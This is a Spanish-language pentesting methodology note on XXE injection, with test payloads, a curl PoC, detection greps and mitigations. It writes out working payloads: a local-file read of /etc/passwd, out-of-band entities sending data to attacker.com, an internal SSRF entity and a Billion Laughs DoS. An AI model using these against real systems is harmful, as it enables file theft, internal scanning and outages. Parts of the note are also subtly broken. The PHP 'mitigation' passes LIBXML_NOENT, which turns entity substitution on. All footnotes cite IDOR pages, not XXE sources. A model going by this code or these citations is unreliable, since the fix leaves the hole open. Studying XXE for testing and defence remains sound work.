# XML External Entity (XXE) 

## Resumen

XXE es una vulnerabilidad que permite a un atacante incluir entidades externas en documentos XML procesados por el servidor, provocando la lectura de archivos locales, escaneo de redes internas y, en escenarios avanzados, ejecución remota de código o Denegación de Servicio. Afecta a cualquier aplicación que parsea XML sin deshabilitar la resolución de entidades externas o DTD.[^2]

## Contexto

Motores y librerías vulnerables:

- **Java:** `DocumentBuilderFactory`, `SAXParserFactory` si `external-general-entities` y `external-parameter-entities` están habilitados.
- **.NET:** `XmlDocument`, `XmlTextReader` con `XmlResolver` por defecto.
- **PHP:** `simplexml_load_string`, `DOMDocument` sin desactivar `LIBXML_NOENT`.
- **Python:** `xml.etree.ElementTree`, `lxml` con resolución de entidades habilitada.

Los flujos comunes incluyen parsing de: cargas de configuración, mensajes SOAP, SAML, feeds RSS, XML en POST, SOAP APIs, GData, SVG.

## Metodología de Ataque

### 1. Identificación de Puntos de Inyección

- Endpoints que aceptan XML en body (`Content-Type: application/xml` o `text/xml`).
- Campos de SOAP (`<soapenv:Body>`).
- Importación de configuración vía XML.
- Parsers de SAML (`AuthnRequest`).

### 2. Pruebas Manuales Básicas

#### 2.1 External Entity Disclosure (OOB)

```xml
<?xml version="1.0"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<doc>&xxe;</doc>
```

- Si responde con contenido de `/etc/passwd`, hay XXE.

#### 2.2 Blind XXE (OOB)

```xml
<?xml version="1.0"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://attacker.com/steal">
]>
<doc>&xxe;</doc>
```

- El atacante monitorea su servidor HTTP para recibir la petición.

### 3. Explotación Avanzada

#### 3.1 SSRF interno

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

#### 3.2 Out-of-band File Read

```xml
<!ENTITY xxe SYSTEM "ftp://attacker.com/steal?data=file contents">
```

#### 3.3 Denial of Service – Billion Laughs

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [  
 <!ENTITY lol "lol">  
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">  
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">  
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">  
]>
<lolz>&lol3;</lolz>
```

## Pruebas Manuales

1. **Enviar XML malicioso** con entidad externa.
2. **Observar respuesta** con contenido local o error indicando lectura.
3. **Verificar OOB** monitoreando servidor atacante.
4. **Probar B Billion Laughs** para evaluar DoS.

## PoC

```bash
curl -X POST https://victima.com/api/xml \
  -H "Content-Type: application/xml" \
  --data-binary @xxe.xml
```

Contenido de `xxe.xml` como en 2.1.

## Automatización

- **XXEInjector (Burp extension)** para generar vectores OOB y DoS.
- **XXE-Scanner (CLI)** detecta y explota XXE automáticamente.
- **XXESpy** para monitoreo de callbacks HTTP/FTP.

## Explotación / Impacto

- **Lectura de archivos sensibles** (`/etc/passwd`, claves privadas).
- **Escaneo interno** de servicios no expuestos.
- **Robo de tokens** (config de AWS metadata).
- **Denegación de Servicio** por expansión de entidades.
- **RCE** en casos de parser con extensiones dinámicas.

## Detección

```bash
grep -R "<!ENTITY" /path/to/code  
grep -R "DocumentBuilderFactory" -n .
```

Monitor de logs de errores XML que incluyan trazas de DTD.

## Mitigaciones

1. **Deshabilitar DTD y entidades externas**:
   - Java:

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- PHP:

```php
libxml_disable_entity_loader(true);
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

- Python lxml:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
etree.fromstring(xml, parser)
```

2. **Validación de input**: rechazar DTDs (`<!DOCTYPE`).
3. **Uso de formatos alternativos**: JSON cuando sea posible.
4. **Principio de menor privilegio**: parsers sin permisos de red o sistema.

## Reporte

**Título:** XML External Entity Injection – Exposición de Recursos Internos
**Resumen Ejecutivo:** El endpoint `/api/xml` procesa DTD con entidades externas, permitiendo lectura de `/etc/passwd` y SSRF.
**Pasos de Reproducción:**

1. Enviar XML con `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
2. Confirmar respuesta con contenido de passwd.
3. Probar entidad OOB y verificar callback.
   **Mitigación Recomendada:** Deshabilitar DTD y resolución de entidades externas, validar input XML y usar JSON.

## Fuentes

OWASP – XXE Prevention Cheat Sheet[^1]
PortSwigger – Web Security Academy XXE Labs[^2]
WSTG – Testing for XML Injection[^3]
CWE-611 – Improper Restriction of XML External Entity Reference[^4]

<div style="text-align: center">⁂</div>

[^1]: https://portswigger.net/web-security/access-control/idor
    
[^2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
    
[^3]: https://spyboy.blog/2024/09/19/idor-vulnerabilities-finding-exploiting-and-securing/
    
[^4]: https://bigid.com/blog/idor-vulnerability/
